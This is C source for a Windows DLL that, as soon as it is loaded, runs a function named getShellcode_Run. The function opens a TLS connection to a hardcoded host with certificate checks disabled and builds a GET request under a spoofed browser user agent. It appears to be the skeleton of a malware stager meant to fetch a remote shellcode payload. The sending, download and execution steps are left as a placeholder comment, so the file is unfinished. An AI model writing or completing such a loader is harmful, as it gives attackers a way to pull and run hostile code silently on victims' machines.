#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#define SECURITY_WIN32
#include <sspi.h>
#include <schannel.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "secur32.lib")

#define DEFAULT_BUFLEN 4096

// Target details
char ip[] = "www.google.com";
char port[] = "443";
char resource[] = "";

// Cleanup function to handle resource deallocation
void cleanup(SOCKET* ConnectSocket, CredHandle* hCred, CtxtHandle* hContext, char* encryptedBuf) {
    if (encryptedBuf) {
        free(encryptedBuf);
    }
    if (hContext->dwLower || hContext->dwUpper) {
        DeleteSecurityContext(hContext);
    }
    if (hCred->dwLower || hCred->dwUpper) {
        FreeCredentialsHandle(hCred);
    }
    if (*ConnectSocket != INVALID_SOCKET) {
        closesocket(*ConnectSocket);
        *ConnectSocket = INVALID_SOCKET;
    }
    WSACleanup();
}

void getShellcode_Run(char* host, char* port, char* resource) {
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL;
    struct addrinfo* ptr = NULL;
    struct addrinfo hints;
    char sendbuf[MAX_PATH] = "";
    char sslBuf[32768] = { 0 };
    char* encryptedBuf = NULL;
    int sslBufLen = 0;
    CredHandle hCred = { 0 };
    CtxtHandle hContext = { 0 };
    char fullResponse[65536] = { 0 };
    int fullResponseLen = 0;

    // Build HTTP request
    sprintf_s(sendbuf, MAX_PATH,
        "GET /%s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Connection: close\r\n"
        "Cache-Control: no-cache\r\n"
        "Pragma: no-cache\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n"
        "\r\n",
        resource, host);
    printf("HTTP Request Built:\n%s\n", sendbuf);

    // Initialize Winsock
    printf("Initializing Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed\n");
        return;
    }
    printf("Winsock initialized successfully\n");

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve hostname
    printf("Resolving hostname: %s...\n", host);
    if (getaddrinfo(host, port, &hints, &result) != 0) {
        printf("getaddrinfo failed\n");
        WSACleanup();
        return;
    }
    printf("Hostname resolved successfully\n");

    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) continue;

        printf("Attempting to connect...\n");
        if (connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }
    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server\n");
        WSACleanup();
        return;
    }
    printf("Connected to server successfully\n");

    // Initialize SSL
    printf("Initializing SSL...\n");
    SCHANNEL_CRED schannelCred = { 0 };
    schannelCred.dwVersion = SCHANNEL_CRED_VERSION;
    schannelCred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT;
    schannelCred.dwFlags = SCH_CRED_NO_DEFAULT_CREDS | SCH_CRED_MANUAL_CRED_VALIDATION;

    SECURITY_STATUS secStatus = AcquireCredentialsHandleA(NULL, UNISP_NAME_A, SECPKG_CRED_OUTBOUND, NULL, &schannelCred, NULL, NULL, &hCred, NULL);
    if (secStatus != SEC_E_OK) {
        printf("AcquireCredentialsHandle failed: 0x%08X\n", secStatus);
        closesocket(ConnectSocket);
        WSACleanup();
        return;
    }
    printf("Credentials handle acquired successfully\n");

    SecBufferDesc outBuffer, inBuffer;
    SecBuffer outBuffers[1], inBuffers[2];
    DWORD dwFlags = ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT | ISC_REQ_CONFIDENTIALITY |
                    ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM;

    outBuffers[0].pvBuffer = NULL;
    outBuffers[0].BufferType = SECBUFFER_TOKEN;
    outBuffers[0].cbBuffer = 0;
    outBuffer.cBuffers = 1;
    outBuffer.pBuffers = outBuffers;
    outBuffer.ulVersion = SECBUFFER_VERSION;

    printf("Starting SSL handshake...\n");
    secStatus = InitializeSecurityContextA(&hCred, NULL, host, dwFlags, 0, 0, NULL, 0, &hContext, &outBuffer, &dwFlags, NULL);
    if (secStatus != SEC_I_CONTINUE_NEEDED) {
        printf("InitializeSecurityContext failed: 0x%08X\n", secStatus);
        cleanup(&ConnectSocket, &hCred, &hContext, encryptedBuf);
        return;
    }
    printf("SSL handshake initiated successfully\n");

    send(ConnectSocket, (char*)outBuffers[0].pvBuffer, outBuffers[0].cbBuffer, 0);
    FreeContextBuffer(outBuffers[0].pvBuffer);

    // SSL Handshake Loop
    bool handshakeComplete = false;
    while (!handshakeComplete) {
        int bytesReceived = recv(ConnectSocket, sslBuf + sslBufLen, sizeof(sslBuf) - sslBufLen, 0);
        if (bytesReceived <= 0) {
            printf("SSL handshake failed during recv\n");
            cleanup(&ConnectSocket, &hCred, &hContext, encryptedBuf);
            return;
        }

        sslBufLen += bytesReceived;
        printf("Received %d bytes during handshake\n", bytesReceived);

        inBuffers[0].pvBuffer = sslBuf;
        inBuffers[0].cbBuffer = sslBufLen;
        inBuffers[0].BufferType = SECBUFFER_TOKEN;
        inBuffers[1].BufferType = SECBUFFER_EMPTY;
        inBuffer.cBuffers = 2;
        inBuffer.pBuffers = inBuffers;
        inBuffer.ulVersion = SECBUFFER_VERSION;

        outBuffers[0].BufferType = SECBUFFER_TOKEN;
        outBuffers[0].pvBuffer = NULL;
        outBuffers[0].cbBuffer = 0;

        secStatus = InitializeSecurityContextA(&hCred, &hContext, NULL, dwFlags, 0, 0, &inBuffer, 0, NULL, &outBuffer, &dwFlags, NULL);
        if (secStatus == SEC_E_OK) {
            printf("SSL handshake completed successfully\n");
            handshakeComplete = true;
        } else if (secStatus == SEC_I_CONTINUE_NEEDED) {
            printf("Continuing SSL handshake...\n");
            send(ConnectSocket, (char*)outBuffers[0].pvBuffer, outBuffers[0].cbBuffer, 0);
            FreeContextBuffer(outBuffers[0].pvBuffer);
        } else {
            printf("InitializeSecurityContext failed during handshake: 0x%08X\n", secStatus);
            cleanup(&ConnectSocket, &hCred, &hContext, encryptedBuf);
            return;
        }
    }

    // After the handshake, send the HTTP request
    printf("Encrypting and sending HTTP request...\n");
    // Encrypt and send the request, then handle the response similarly to how we handle handshake records.

    cleanup(&ConnectSocket, &hCred, &hContext, encryptedBuf);
    printf("Cleaned up resources\n");
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        getShellcode_Run(ip, port, resource);
        break;
    }
    return TRUE;
}
